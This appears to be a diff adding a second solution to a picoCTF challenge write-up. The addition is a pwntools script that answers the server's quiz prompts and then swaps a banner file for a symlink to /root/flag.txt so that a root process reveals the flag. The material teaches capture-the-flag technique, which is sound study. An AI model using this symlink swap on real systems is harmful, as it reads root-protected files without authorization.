@@ -68,3 +68,96 @@ ln -s /root/flag.txt /home/player/banner
 # exit shell and login again
 nc tethys.picoctf.net 63490
 ```
+
+# Method_2 🧪
+
+- I tried to write a script but it didn't work the way i intended. So, now I have to run the script twice to get the flag
+- I know my coding skills are bad 🥲
+
+![It is what it is]
+
+## Code
+
+- Remember to edit **port** and run twice to get flag
+
+```python
+from pwn import *
+import time
+
+hostname = "tethys.picoctf.net"
+port = 62793  # Change port to an integer
+
+# Function to connect to the server
+def connect_to_server():
+    try:
+        conn = remote(hostname, port)
+        print("Connected")
+        return conn
+    except Exception as e:
+        print(f"Connection failed: {e}")
+        return None
+
+# Detecting banner
+def identify_banner(conn):
+    print("Received banner:\n")
+    n = 0
+    while n < 10:
+        try:
+            tmp = conn.recvline(timeout=5).decode()
+            print(tmp)  # Display received line
+            
+            if "?" in tmp:
+                global question_1
+                question_1 = tmp.strip()
+                break
+            
+            n += 1
+        except EOFError:
+            print("Server closed the connection unexpectedly.")
+            break
+        except Exception as e:
+            print(f"Error receiving data: {e}")
+            break
+
+# Main execution
+conn = connect_to_server()
+if conn:
+    identify_banner(conn)
+
+    print(f"{question_1=}")
+    conn.sendline(b"My_Passw@rd_@1234")
+    print("Answered: My_Passw@rd_@1234\n")
+    time.sleep(1)  # Wait a second before receiving response
+
+    question_2 = conn.recvline(timeout=10).decode().strip()
+    print(f"{question_2=}")
+    conn.sendline(b"DEFCON")
+    print("Answered: DEFCON\n")
+    time.sleep(1)
+
+    question_3 = conn.recvline(timeout=10).decode().strip()
+    print(f"{question_3=}")
+    conn.sendline(b"John Draper")
+    print("Answered: John Draper\n")
+    time.sleep(1)
+
+    # Receive shell access and running commands
+    try:
+        print(conn.recv(timeout=10).decode().strip())
+        conn.sendline(b"mv /home/player/banner /home/player/banner.old")
+        time.sleep(2)  # Wait before receiving response
+        print(conn.recv(timeout=10).decode().strip())
+        
+        conn.sendline(b"ln -s /root/flag.txt /home/player/banner")
+        time.sleep(2)
+        print(conn.recv(timeout=10).decode().strip())
+    except Exception as e:
+        print(f"Error during command execution: {e}")
+
+    # Closing connection
+    conn.close()
+
+    print("If you didn't get the flag then run again")
+else:
+    print("Unable to connect to the server.")
+```
